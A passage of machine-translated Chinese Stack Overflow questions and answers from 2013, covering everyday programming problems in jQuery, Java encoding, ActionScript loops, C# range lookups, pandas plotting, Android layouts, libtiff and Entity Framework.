        ....
        $('button').removeClass("ui-state-hover");
      }
  });
</script> 
```

但是鼠标悬停在按钮上，样式按钮更改为 ui-state-hover。如何删除 ui-state-hover？我希望 ui-state-hover 添加了 jquery 代码，但我不知道如何将其关闭。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:27:29.210

我找到了解决方案

```
 $("button").mouseover(function() {
    $(this).removeClass("ui-state-hover");
  }); 
```

# java - Java int 到带有特殊字符的 char

> ID：15262521
> 
> 赞同：1
> 
> 时间：2013-03-07T03:23:36.443
> 
> 标签：java, encoding, stream, streaming, inputstream

以前，我有这样的代码：

```
 Writer writer = new OutputStreamWriter(System.out, "UTF-8");
        generator.stream(writer); 
```

现在，我的代码如下所示：

```
 string = new StringBuilder();
            OutputStream output = new OutputStream()
            {
                public String getString()
                {
                    return string.toString();
                }
                @Override
                public void write(int b) throws IOException {
                if ((char)b != '\n')
                {
                    string.append((char) b );
                }
            }

            public String toString(){
                return string.toString();
            }
        };

        Writer writer = new OutputStreamWriter(output, "UTF-8");
        generator.stream(writer);

        writer.close();
        PrintStream ps = new PrintStream(System.out, true, "UTF-8");
        ps.println(string.toString()); 
```

第一个代码的问题在于它不能保证输出在一行中。另一方面，我的新代码解决了这个问题，但是，出现了一个新问题：输出发送的是 'ￃﾁ' 而不是 'Á'，这很痛苦，因为应该支持匈牙利和波兰字符。对于非匈牙利语、非波兰语字符，我当前的输出是正确的，但是我的新代码无法处理书面匈牙利语和波兰语中的特殊字符。我该如何克服这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T04:35:49.577

而是扩展 OutputStreamWriter 类并覆盖适当的方法以删除换行符。

```
public class NoNewLineOutputStreamWriter extends OutputStreamWriter {

    public NoNewLineOutputStreamWriter(OutputStream out,String charset) throws UnsupportedEncodingException {
        super(out,charset);
    }

    public void write(String str) throws IOException {
        super.write(str.replaceAll("\n", ""));
    };

    public void write(int c) {
        if (c == '\n')
            return;
        else
            super.write(c);
    }

} 
```

然后像以前一样打电话给你的作家

```
 Writer writer = new NoNewLineOutputStreamWriter(System.out, "UTF-8");
    generator.stream(writer); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:12:18.530

这一定是因为操作系统的默认字符集。
我有关于 é 转换为 é 的类似问题。
我将 JVM file.encoding 更改为 UTF as `-Dfile.encoding=UTF-8`.
然后我的问题就解决了。

**也请阅读：**

*   [设置默认 java 字符编码](https://stackoverflow.com/questions/361975/setting-the-default-java-character-encoding)

*   [在 java 下的不同平台中定义重音字符](https://stackoverflow.com/questions/15236836/defining-accent-characters-in-different-platforms-under-java)

# actionscript-3 - （Actionscript 3 noob）你如何正确使用“继续”？

> ID：15262522
> 
> 赞同：0
> 
> 时间：2013-03-07T03:23:37.753
> 
> 标签：actionscript-3

我要做的事情是我需要在第 9 个圆圈上添加 50% 的 alpha，除了第 5 个圆圈，这是我迄今为止尝试过的……我缺少什么？顺便说一句，如果我用“break”替换“continue”，它会完美运行。

```
function rendreAlpha(pEvt:MouseEvent)
{
    for (var i:int=1; i<=9; i+=1)
    {
        trace(i);
        this["balle" + i + "_mc"].alpha = 0.5;
        if (i == 5)
        {
            continue;
        }
    }
}
btn2.addEventListener(MouseEvent.CLICK,rendreAlpha); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:28:12.647

设置. `if`_ *_* _`alpha`

因此，`continue;`不会跳过任何额外的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:50:29.363

`continue`将结束循环中的当前迭代`for`并移至下一个迭代，跳过该迭代的 continue 语句之后发生的任何操作。

`break`将结束整个循环并跳过该迭代中发生的任何代码。

这是一个小演示，可以帮助您更清楚地理解两者：

```
for(var i:int = 0; i < 10; i++)
{
     if(i < 5)
     {
         // Skip the rest of the code in this block and move to the
         // next iteration.
         continue;
     }

     trace(i);

     if(i === 8)
     {
         // End the entire loop.
         break;
     }
} 
```

您会注意到您的输出仅包括`5,6,7 & 8`. 这是因为我们`continue`跳过`trace`块中的语句 if`i`小于 5，并在它达到 8 时结束循环。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-11T21:02:35.803

在 Flash 播放器 10.1 中：

```
private static function stackDump():void
    {

        //obj can be an object, dictionary, vector, array.
        //probably anything that can be accessed using bracket notation.
        var obj:Array = [1, 2];
        var dex:int = 0;

        //if you access an object,vector,array,or dictionary using a nested incrimentor operator
        //followed by a continue statement, you will get a stack dump.
        //The loop can be a for, while, or do loop.
        while (false)
        {
            obj[dex++] = 0;
            continue;
        }

    }//end stackDump 
```

# asp.net - 使用 masterpage .net 4.5 时 Ajaxtoolkit 不工作

> ID：15262524
> 
> 赞同：0
> 
> 时间：2013-03-07T03:23:49.587
> 
> 标签：asp.net, ajax, visual-studio-2012, .net-4.5

我正在使用 .net 4.5 。我有 ajaxtoolkit 代码在 asp.net 页面不使用母版页时工作。当我将相同的 ajaxtoolkit 代码放在不使用母版页的页面中时，代码工作正常。

我得到的错误是：

此页面缺少要添加的 CSS 样式表链接所需的 HtmlHead 控件。请加 。

什么？

ajaxtoolkit 代码

```
<ajaxToolkit:ToolkitScriptManager ID="ToolkitScriptManager1" runat="server"></ajaxToolkit:ToolkitScriptManager> 

<ajaxToolkit:Twitter ID="Twitter1"  ScreenName="myscreenname"  Mode="Profile" runat="server"></ajaxToolkit:Twitter> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T06:53:11.463

添加下面一个..

```
<head runat="server"> 
```

可以帮助你吗

# c# - 针对 +5M 记录表的快速内存范围查找

> ID：15262525
> 
> 赞同：2
> 
> 时间：2013-03-07T03:23:50.443
> 
> 标签：c#, performance, azure, lookup-tables

我有一个带有 +5M 静态记录的数据库表。简单结构：（开始 int，结束 int，结果 int）。所以我有一个特定的INT，我需要找到它对应的结果（int）。目前，查找表在 DB 中，但它需要驻留在内存中，很可能在没有数据库访问权限的环境中。

我的解决方案需要在没有数据库访问的情况下在内存中执行此逻辑，并且速度超快，因为我需要每秒处理 1000 次事务。根据这篇文章：[Doing a range lookup in C# - how to](https://stackoverflow.com/questions/8948205/doing-a-range-lookup-in-c-sharp-how-to-implement/8949322#8949322) implement 但我不知道它会在这样的规模上表现如何。

*   我是否在“启动时”预加载该表？这可能需要一段时间。
*   有什么方法可以将表格加载到某个 .dat 文件中并在运行时进行超高效的查找？

顺便说一句，我在 Azure 上，不确定使用存储表是否有助于查找...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:33:23.753

二进制搜索非常快。对 50M 条记录进行二分搜索只需 27 次比较即可找到答案。只需将其加载到内存中并使用您链接的范围查找。

如果您发现它很慢，请开始优化：

*   将 Range 对象更改为 struct 而不是 class
*   手动编写您自己的二进制搜索算法，该算法 (a) 直接实现相等比较器而不是调用 an`IEqualityComparer`并且 (b) 在执行搜索时使用指针和其他不安全的技巧来禁用数组边界检查。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T03:32:50.770

您链接到的范围查找代码执行二进制搜索，因此性能将为`O(log n)`. 我认为对于范围查找，没有比这更好的了。A`HashSet<T>`的查找是 O(1)，但您不能使用该结构进行范围查找。

500 万条记录并不是一个巨大的数字。我建议您使用链接到您将在生产中使用的硬件上的代码实现概念验证，并测量性能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:34:48.490

你当然可以把它放在一个顺序文件中并在启动时加载它。50 MB 将在不到一秒的时间内从磁盘中取出。即使您必须将其解析为文本文件，您也应该能够在另一秒钟内创建表格。当您使用 2 GHz（或更快）的处理器处理它们时，500 万条记录并没有那么大。

列表的二进制搜索是 O(log n)，因此每次搜索最多可以进行 24 次探测。这将非常快。

加载测试这样的东西应该很容易。只需启动它，然后查看执行 1,000,000 次查找需要多长时间。就像是：

```
var clock = Stopwatch.StartNew();
for (int i = 0; i < NumIterations; ++i)
{
    int val = GetRandomValueToSearchFor(); // however you do that
    Ranges.BinarySearch(val, RangeComparer);
}
clock.Stop();
// time per iteration is clock.TotalMilliseconds/NumIterations 
```

这会让您找出查询该事物的绝对最快速度。我怀疑你每秒处理数千笔交易会很好。

# php - 如何在 Wordpress 的 query_posts 中修剪元键？

> ID：15262526
> 
> 赞同：0
> 
> 时间：2013-03-07T03:23:51.650
> 
> 标签：php, wordpress, meta

好的。所以我有一个插件可以存储这样的亚马逊价格：320.32 美元。所以它将它存储为一个字符串。问题是我想使用 query_posts 按价格组织我的产品，因为价格是动态的并且会发生变化。

例如，我想获取价格元键 amzn_LowestNewPrice 并将其与使用 BETWEEN 之类的其他值进行比较。出于测试目的，我现在只是在做一个 EQUAL ，直到我猜这可行。

问题是我需要首先修剪 Query_Posts 中的元键，而我所做的一切似乎都不起作用。

在此示例中，我在其上使用 LTRIM 删除 $，然后使用 intval 使其成为数字。但它不起作用。

```
<?php if (is_category('100-laptops-with-webcam')) { ?>

<?php query_posts(array('meta_key'=>'amzn_LowestNewPrice', 'meta_query'=>array(array('key'=>(intval(ltrim($post->amzn_LowestNewPrice,'$'))), 'compare'=>'=', 'type'=>'NUMERIC', 'value'=>179)))); ?>

<?php }; ?> 
```

有什么建议么？非常感谢！

# matplotlib - 如何从 pandas 数据框中提取日期索引以用作 matplotlib 中的 x 轴

> ID：15262527
> 
> 赞同：6
> 
> 时间：2013-03-07T03:24:09.477
> 
> 标签：matplotlib, pandas

我试图在 pandas 数据框中绘制数据，使用索引（日期和时间）作为 x 轴，并将数据框中的其余数据作为实际数据。这是我现在正在尝试的：

```
from matplotlib.finance import candlestick2

bars[['open','high','low','close']].head()

tickdatetime         open        high        low         close          

2012-09-20 09:00:00  1447.50     1447.50     1447.00     1447.00

2012-09-20 09:01:00  1447.00     1447.25     1447.00     1447.25

2012-09-20 09:02:00  1447.25     1447.75     1447.25     1447.50

2012-09-20 09:03:00  1447.75     1447.75     1447.25     1447.50

2012-09-20 09:04:00  1447.25     1447.50     1447.25     1447.50

fig,ax = plt.subplots()
ax.plot_date(bars.ix.to_pydatetime(), s, 'v-')
fig,ax = plt.subplots()
ax.plot_date(bars.ix.to_pydatetime(), s, 'v-')
ax = fig.add_axes([0.1, 0.2, 0.85, 0.7])
ax.autoscale_view()
linecol, rectcol =  candlestick2(ax,bars['open'],bars['close'],bars['high'],bars['low'],width=.5,colorup='g',colordown''r',alpha=1) 
z  = rectcol.get_zorder()
linecol.set_zorder(0.9*z) 
```

但我收到此错误：

```
AttributeError                            Traceback (most recent call last)
<ipython-input-57-d62385067ceb> in <module>()
1 fig,ax = plt.subplots()
----> 2 ax.plot_date(bars.ix.to_pydatetime(), s, 'v-')
3 
4 #ax = fig.add_axes([0.1, 0.2, 0.85, 0.7])
5 ax.autoscale_view()

AttributeError: '_NDFrameIndexer' object has no attribute 'to_pydatetime' 
```

* * *

我知道 bar.plot() 是一个很好的接口来自动处理这个问题，但我希望能够做一些事情，比如使用烛台2、更多的子图等。

我认为我的问题的根源只是试图从数据框中获取索引值，并将索引值转换为日期时间，但我还不能这样做。

任何想法表示赞赏！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T22:09:38.523

正如常舍所说，`bars.index`是你想要的，不是`bars.ix`。`bars.index`返回一个 Index 对象，它本质上是一个带有索引的 Series。这就是你想要的。bar.ix 返回一个 _NDFrameIndexer，它似乎记录得很差，但却是整个 DataFrame 的某种视图（例如 try `bars.ix[2]`）。

在您的代码中用 bar.index 替换 bar.ix 将删除错误（如果您还删除了导致不匹配 ' 的错字），并在前两个子图上制作日期刻度。但是，值得注意的是，它不会在您的烛台图上制作日期刻度：您的代码不会这样做，尽管使用 bar.index 肯定可以轻松完成。

但是，如果您想在您的烛台 2 绘图上放置日期刻度，那就有点困难了。这里的问题是烛台 2，正如您输入的内容所见，根本不使用 x 轴值。它在 0,1,2... 处绘制烛台，依此类推。如果您尝试使用日期设置 x 轴，无论是刻度还是限制，那么一切都会搞砸，因为您的绘图将在 x 轴上完全不同的某个地方。

解决此问题的一种简单方法（不涉及使用烛台代替烛台2）是让您的 x 轴保持为数据的整数索引，而是根据您的日期设置刻度*标签。*因此，例如：

```
fig = figure() 
ax = fig.add_subplot(111) 
candlestick2(ax,bars['open'],bars['close'],bars['high'],bars['low'],width=.5,colorup='g',colordown='r',alpha=1)
ax.set_xticks(arange(0,len(bars))) 
ax.set_xticklabels(bars.index,rotation=70) 
```

这会绘制您的日期，(a) 确保您的刻度位于整数位置，然后根据日期设置这些刻度的标签。我还旋转了它们，以便您可以实际看到它们。ax.set_xticklabels 接受字符串，因此您可以根据需要修改日期格式。

# jquery - jQuery 绘制多个图像

> ID：15262528
> 
> 赞同：0
> 
> 时间：2013-03-07T03:24:10.590
> 
> 标签：jquery, jsp, spring-mvc

我正在使用 Spring MVC，并且我有一个在数据库中搜索记录并将记录列表返回到另一个页面的表单。然而，返回的数据在标签上绘制图像。只有第一个图像被绘制在表单上，​​其余的不是。我知道这与 jquery 中的循环闭包有关，但我如何才能在这里克服它。

对 jscript 进行了一些编辑，但是只有第一张图像显示在所有画布上

**JavaScript：**

$(文档).ready(函数() {

```
 $(".photos").each(function(i){                      
        if ($(this).val() != '') {
            alert($(this).val());
            var image = new Image();
                var foto = $(".photos").val();                         
                image.src =  $(".photos").val();
                image.onload = function(){ 
                    //var foto = $(".photos").val();                         
                    //image.src =  $(".photos").val();
                     $(".canvas").each(function(i){
                         var ctx = document.getElementsByClassName("canvas")[i].getContext('2d');
                         ctx.drawImage(image,0,0, 320, 240); 
                     });                        
                }                   
        }
    });                     
}); 
```

**CitizenList.jsp**：

```
<title>Citizen Search Results</title>
 </head>
  <body>
   <c:forEach items="${citizens}" var="citizen">
    <div><p><canvas class="canvas" height="240" width="320"></canvas></div>
        First name:- ${citizen.fName} , Last Name:- ${citizen.lName}
        <input type="text" value="${citizen.photo}" class="photos"/>
    </c:forEach>

   </body>
  </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T17:39:35.730

您`photo`使用一个 id 多次创建输入框。

```
<input type="text" id="photo" value="${citizen.photo}"/> 
```

在一个`foreach`.

```
<c:forEach items="${citizens}" var="citizen"> 
```

它将像这样呈现html：

```
<div><p><canvas id="canvas" height="240" width="320"></canvas></div>
    First name:-Jim , Last Name:- Doe
    <input type="text" id="photo" value="xyz"/>

<div><p><canvas id="canvas" height="240" width="320"></canvas></div>
    First name:- Bob , Last Name:- Doe
    <input type="text" id="photo" value="abc"/> 
```

当然，您的 jQuery 查找`$("#photo")`只匹配第一个。

* * *

相反，您可以给它们一个类并迭代它们：

```
<input type="text" id="photo${status.id}" class="photo" value="${citizen.photo}"/> 
```

并使用 jQuery foreach 遍历它们

```
$('.photo').each(function(){ //.. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-09T01:24:35.993

图片来源需要参考`$(this).val()`。无需遍历每个画布，只需要使用索引移动到当前画布即可。下面是完整的解决方案：

```
 <script type="text/javascript">

    $(document).ready(function() {

            $(".photos").each(function(i){                      
                if ($(this).val() != '') {
                       var image = new Image();                      
                        image.src =  $(this).val();

                        image.onload = function(){ 
                                 var ctx = document.getElementsByClassName("canvas")[i].getContext('2d');
                                 ctx.drawImage(image,0,0, 320, 240); 
                         }               
                }
            });                     
        });

    </script> 
```

# android - getView 仅在 android api level 8 上滚动时调用

> ID：15262537
> 
> 赞同：4
> 
> 时间：2013-03-07T03:24:48.270
> 
> 标签：android, baseadapter

我有我的活动。它在 android 4.2 上完美运行，但是当我在 2.3（模拟器和真实设备）上运行它时，我看到一个白屏（仅在底部我看到“下一个”项目的一些像素），当我开始滚动。

![在此处输入图像描述](../Images/446068edaef8c0265618f9da2280ace8.png) ![在此处输入图像描述](../Images/81a9205bd3ca4caaf3f164e3e1505b97.png)

名单：

```
<?xml version="1.0" encoding="utf-8"?>
<ListView xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:id="@+id/category_browser"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:clipChildren="false"
        android:dividerHeight="1dp"
        tools:listitem="@layout/category_browser_list_item" >
</ListView> 
```

这几项：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/category_browser_list_item"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_gravity="fill"
    android:background="#ffffff"
    android:clickable="true"
    android:gravity="fill"
    android:orientation="horizontal" >
        <ImageView
            android:id="@+id/category_browser_list_icon"
            android:layout_width="90dp"
            android:layout_height="90dp"
            android:layout_gravity="fill"
            android:layout_weight="0"
            android:background="#ffffff"
            android:contentDescription="@+id/category_browser_list_item_description"
            android:src="@drawable/icon" />
        <TextView
            android:id="@+id/category_browser_list_title"
            android:layout_width="wrap_content"
            android:layout_height="match_parent"
            android:layout_weight="1"
            android:gravity="center_vertical|start"
            android:paddingLeft="10dp"
            android:paddingRight="10dp"
            android:text="@string/category_browser_title"
            android:textColor="#000000"
            android:textSize="24sp" />
        <CheckBox
            android:id="@+id/category_browser_list_checkbox"
            android:layout_width="40dp"
            android:layout_height="40dp"
            android:layout_gravity="center_vertical"
            android:layout_weight="0"
            android:clickable="false" />
</LinearLayout> 
```

编码：

```
protected LinearLayout getListElementView() {
    View listItem = inflator.inflate(R.layout.category_browser_list_item, null);
    LinearLayout listElement = (LinearLayout)listItem.findViewById(R.id.category_browser_list_item);
    return listElement;
}

    public class CategoryListAdapter extends BaseAdapter {
        @Override
        public int getCount() {
            int count = null != categories && null != categories.categories ? categories.categories.size() : 0;
            Log.d(TAG, "getCount:" + count);
            return count;
        }

        @Override
        public Category getItem(int position) {
            return null != categories && null != categories.categories ? categories.categories.get(position) : null;
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        // create a new ImageView for each item referenced by the Adapter
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            LinearLayout listView = null;
            if (convertView != null) { // if it's not recycled, initialize some attributes
                listView = (LinearLayout)convertView;
            }
            if (listView == null) { // if it's not recycled, initialize some attributes
                listView = getListElementView();
            }

            final Category category = getItem(position);
            category.setListView(listView);
            File cacheIconFile = category.getCacheIconFile();
            ImageView imageView = (ImageView)listView.findViewById(R.id.category_browser_list_icon);
            if (cacheIconFile.exists()) {
                imageView.setImageURI(Uri.fromFile(cacheIconFile));
            } else {
                Drawable noIcon = getResources().getDrawable(R.drawable.icon);
                imageView.setImageDrawable(noIcon);
            }
//          Log.i(TAG, category.name + ": " + category.iconUrl + ": " + category.downloadBaseUrl);
            if (null != category.name) {
                TextView textView = (TextView)listView.findViewById(R.id.category_browser_list_title);
                textView.setText(category.name);
            }

            listView.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    //start downloading category with downloadmanager
                    //(category);
                    Intent intent = category.getIntent();
                    if (null != intent)
                        startActivity(intent);
                    else {
                        category.setStatus(Category.CategoryDownloadStatus.DOWNLOADING);
                        downloadLocalePackage(category);
                    }
                }
            });
            return listView;
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:18:23.620

`android:clipChildren="false"`从您的`ListView`XML 声明中删除。虽然您看到的效果可能是 2.2/2.3 中的一个错误，已在更高版本中解决，但该属性在`ListView`.

# android - 组织多个视图

> ID：15262541
> 
> 赞同：0
> 
> 时间：2013-03-07T03:25:25.910
> 
> 标签：android, listview, out-of-memory

我必须创建这样的布局：

![截屏](../Images/b0efc75bfb74cdbb053f02ab11196a52.png)

如您所见，所有视图（图像、按钮）都位于可滚动屏幕中。这是专辑的布局。

问题是当我在这张专辑屏幕上显示许多图像时，它会因内存不足错误而崩溃。

我选择的方式是将它们全部放在一个`LinearLayout`inside a`ScrollView`中。我知道如果我们需要显示很多视图，我们可以使用 listview，但我不能用`ListView`.

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:22:06.680

您可以使用 inSampleSize 来减少内存占用。

这是我的代码

```
public static Bitmap decodeAndResizeFile(File f) {
    try {
        // Decode image size
        BitmapFactory.Options o = new BitmapFactory.Options();
        o.inJustDecodeBounds = true;
        BitmapFactory.decodeStream(new FileInputStream(f), null, o);

        // The new size we want to scale to
        final int REQUIRED_SIZE = 70;

        // Find the correct scale value. It should be the power of 2.
        int width_tmp = o.outWidth, height_tmp = o.outHeight;
        int scale = 1;
        while (true) {
            if (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE)
                break;
            width_tmp /= 2;
            height_tmp /= 2;
            scale *= 2;
        }

        // Decode with inSampleSize
        BitmapFactory.Options o2 = new BitmapFactory.Options();
        o2.inSampleSize = scale;
        return BitmapFactory.decodeStream(new FileInputStream(f), null, o2);
    } catch (FileNotFoundException e) {
    }
    return null;
} 
```

在这里，它将使用解码图像`inSampleSize`，此代码将为`inSampleSize`您找到最佳值。

它对我来说很好。

如果你不想使用上面的代码，你也可以使用`bitmap.recycle()`和`System.gc()`释放未使用的内存。但是，上面的代码对我来说很好。您可以使用两者中的任何一个。

```
objbitmap.recycle();
objbitmap = null;
System.gc(); 
```

希望，这可以解决问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:00:59.853

要制作这种类型的视图，您必须使用线性布局。像这儿

线性布局（垂直）
标题
图像
线性布局水平
{
线性布局垂直
按钮按钮
图像
图像
...
}
线性布局垂直
{
图像
图像
...
}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:49:44.700

我可以想到两个选择：

1.  组织项目，使每个项目视图中的每个项目视图`ListView`都有一组交错的元素，最终它们可以被屏蔽成`ListView`元素。每 N 个图像的顶部/底部都必须在视图边界处对齐。您也许可以将 4-6 个图像以交错的模式放置，这样仍然可以实现效果，但是该元素块变成了可以回收的视图。

2.  `ListView`并排使用两个元素。无论触摸哪一个，您都可以将一个传递`OnScrollListener`给每个`ListView`以同步它们的滚动动作，从而使外观看起来是一个视图。通过这种方式，您可以完全错开图像，但是适配器需要做更多的工作，因为您必须从一个数据源提供两个视图。

# linux - TIFFOpen：打开的文件太多

> ID：15262542
> 
> 赞同：0
> 
> 时间：2013-03-07T03:25:59.257
> 
> 标签：linux, libtiff, geotiff

我正在尝试从 ASTER 数据集中打开一个 geotiff，但它给出了一个我一直无法弄清楚的错误。这是我的代码：

```
#include "stdlib.h"
#include "stdio.h"
#include "tiffio.h"

void read(void);

void main() {
    read();
    return;
}

void read(void) {
    TIFF* file;

    file = TIFFOpen("./ASTGTM2_N50E002_dem.tif", "r");
    if (file != NULL)
        TIFFClose(file);
    else
        printf( "won't open\n" );
    return;
} 
```

我是这样编译的：

```
gcc parse.c -ltiff -lm; 
```

这是我得到的输出的一部分：

```
TIFFOpen: ./ASTGTM2_N50E002_dem.tif: Too many open files.
./ASTGTM2_N50E002_dem.tif: Cannot read TIFF header. 
```

第二条消息重复了几百次，然后

```
won't open 
```

之后显示几百次。

read() 被调用一次，为什么我得到一些 700 多张打印件？

我正在运行 Debian，我检查过

```
lsof | grep ASTGTM2_N50E002_dem.tif 
```

并且没有人打开此文件。

我也遵循了这里的建议：[https ://stackoverflow.com/a/9012019/1877851](https://stackoverflow.com/a/9012019/1877851)

我仍然收到同样的错误。这是怎么回事？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-08T04:23:40.400

您的代码的问题就在我们面前！

你看到你写的那个函数叫做`read()`? 是的，那不好。它与同名的标准库函数发生冲突（尽管参数不同）。所以它最终被 libtiff 调用——而不是从文件中获取数据，它递归地打开，直到程序无法再打开文件，所以 libtiff 停止尝试读取。

重命名你的函数，一切都会好起来的。

# java - 如何在jsp文件中使用request.getparameter和response.redirect将用户名和密码返回给JAVA CLASS

> ID：15262545
> 
> 赞同：0
> 
> 时间：2013-03-07T03:26:23.057
> 
> 标签：java, class, jsp, authentication, login

我对java完全陌生。我有JSP登录页面。现在我想在JAVA CLASS中验证用户名和密码（硬编码）而不是servelet等。如何通过jsp做到这一点我的代码：

```
package FileIO;

public class Login_Authentication {

 String username;
 String password;

public String execute()
{
if(this.username.equals("buyer")
        && this.password.equals("buyPW"))
{
    return "1";

   }else
{
    return "-1";
   }            
  }

 public String getUsername()
 { return username;

   }
public void setUsername(String username)
{
this.username = username;
  }

public String getPassword()
{ return password;
}

public void setPassword(String password)
  {this.password = password;
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:36:19.390

```
you can add follow code in jsp page everywhere(import you package first)
{
<%
Login_Authentication auth = new Login_Authentication();
int result = auth.execute();
out.println(result == 1 ? "you login success" : "login fail!");
%>
} 
```

# ruby - 在 Ruby 中使用 Prawn 替换 PDF 模板中的一些文本

> ID：15262548
> 
> 赞同：0
> 
> 时间：2013-03-07T03:26:56.983
> 
> 标签：ruby, pdf, prawn

我正在使用类似于以下代码的模板在 Prawn 中生成 PDF：

```
Prawn::Document.new(:template => "template.pdf") 
```

这很好用，我可以以正常方式添加到文档中 - 但是我想搜索并替换一些从模板中添加的文本。对虾有可能吗？

查看 Prawn 代码，它执行以下操作：

```
 if options[:template]
   fresh_content_streams(options)
   go_to_page(1)
 else
   .....
 end

 .....

 # adds a new, empty content stream to each page. Used in templating so
 # that imported content streams can be left pristine
 #
 def fresh_content_streams(options={})
   .....
 end 
```

所以它创建了一个新的内容流来防止更改模板中给出的数据 - 问题是我可以查看并使用 Prawn 更改现有的流吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-10T21:39:00.393

[我在Github](https://github.com/prawnpdf/prawn/issues/458)上问过这个问题。显然这是不可能的，而且比我意识到的要复杂得多。

# entity-framework - 无法转换类型为“System.Collections.Generic.HashSet”的对象

> ID：15262550
> 
> 赞同：1
> 
> 时间：2013-03-07T03:27:08.383
> 
> 标签：entity-framework, ef-code-first, code-first

我正在尝试将这些类与 EF Code-First 一起使用来将数据添加到数据库中。在我填充对象并尝试填充上下文“dbContext.Tracks.Add(t1)”之后。我收到错误“无法将'System.Collections.Generic.HashSet`1 [Vinyl7]'类型的对象转换为'Vinyl7'”有人能指出我遗漏了什么吗？

```
Public Class Vinyl7

    <Key>
    Public Overridable Property mediaId As Long
    Public Overridable Property parentMediaId As System.Nullable(Of Long)
    Public Overridable Property side As String

    <ForeignKey("mediaId"), Required>
    Public Overridable Property track As Track

End Class

Public Class Track

    <Key>
    Public Property mediaId As Long
    Public Property title As String

    Public Overridable Property Vinyl7T As ICollection(Of Vinyl7) = New HashSet(Of Vinyl7)
End Class 
```

这是我的上下文

```
Public Class MediaRepo : Inherits DbContext

    Public Sub New()
        MyBase.New("name=MediaDB")

    End Sub

    Protected Overrides Sub OnModelCreating(modelBuilder As DbModelBuilder)

    End Sub

    Public Property Vinyl7s As DbSet(Of Vinyl7)
    Public Property Tracks As DbSet(Of Track)

End Class 
```

这是我的方法。

```
 Using db = New MediaRepo
            Dim t1 = New Track
            t1.title = "Kutchie"
            Dim t2 = New Track
            t2.title = "Drug Trade"

            Dim a = New Media.Vinyl7
            a.side = "A"
            a.parentMediaId = t1.mediaId
            a.track = t1
            Dim b = New Media.Vinyl7
            b.side = "B"
            b.parentMediaId = t1.mediaId
            b.track = t2
            t1.Vinyl7T.Add(a)
            t1.Vinyl7T.Add(b)
            db.Tracks.Add(t1)

            SaveChanges(db)

        End Using 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:54:29.717

我认为你的注释是错误的。您将`mediaId`作为外键引用，但这是您的实体`Track`的主键。`Vinyl7`你大概是说`parentMediaId`对吧？

用这个更新你的`Vinyl7`实体，它将起作用：

```
 <Key>
    Public Overridable Property mediaId As Long       
    Public Overridable Property side As String

    <ForeignKey("mediaId"), Required>
    Public Overridable Property track As Track 
```

**编辑**

根据您的评论，我已更新为 1..0 对 1 的关系。

制作了一个可以运行的快速测试应用程序，您可以将其与您拥有的应用程序进行比较吗？也许你有一些额外的东西让 EF 感到困惑？

```
 Public Class Vinyl7

    <Key>
    Public Overridable Property mediaId As Long
    Public Overridable Property side As String

    <ForeignKey("mediaId"), Required>
    Public Overridable Property track As Track

End Class

Public Class Track
    <Key>
    Public Property trackid As Long
    Public Property title As String

    Public Overridable Property Vinyl7T As Vinyl7

End Class

Module Module1

    Public Class MediaRepo : Inherits DbContext

        Public Sub New()
        End Sub

        Protected Overrides Sub OnModelCreating(modelBuilder As DbModelBuilder)
        End Sub

        Public Property Vinyl7s As DbSet(Of Vinyl7)
        Public Property Tracks As DbSet(Of Track)

    End Class

    Sub Main()
        Dim db As New MediaRepo

        Dim vin = New Vinyl7
        Dim track As New Track

        track.Vinyl7T = vin

        db.Tracks.Add(track)
        db.SaveChanges()

    End Sub

End Module 
```

# html - SAME ROW 的 div 按比例缩放到相同的高度并具有最小高度

> ID：15262554
> 
> 赞同：0
> 
> 时间：2013-03-07T03:27:46.140
> 
> 标签：html, css, layout

所以我看过这篇文章：[我可以使用 CSS 按比例缩放 div 的高度吗？](https://stackoverflow.com/questions/8894506/can-i-scale-a-div-height-proportionally-to-width-of-the-div-with-the-help-of-onl)它有点回答我的问题。我可以根据需要按比例分配 div。但是，我还需要为这些 div 设置最小高度。

在这个小提琴[http://jsfiddle.net/FBZuB/1/](http://jsfiddle.net/FBZuB/1/)中，我已经设置了我想要完成的任务。BLUE div 是一个通用包装器，它根据 BLUE div 的宽度定义 RED div 的高度。但是，当我尝试更改 RED div 上的最小高度时，我想要缩放并具有最小高度的 div 会出现意外结果。

我想一旦我缩小到最小高度点，div 就会停止缩放，只会改变宽度。但是，似乎设置最小高度只是为整个计算设置了某种基点，并且一切都在不断扩展。我希望这是有道理的。

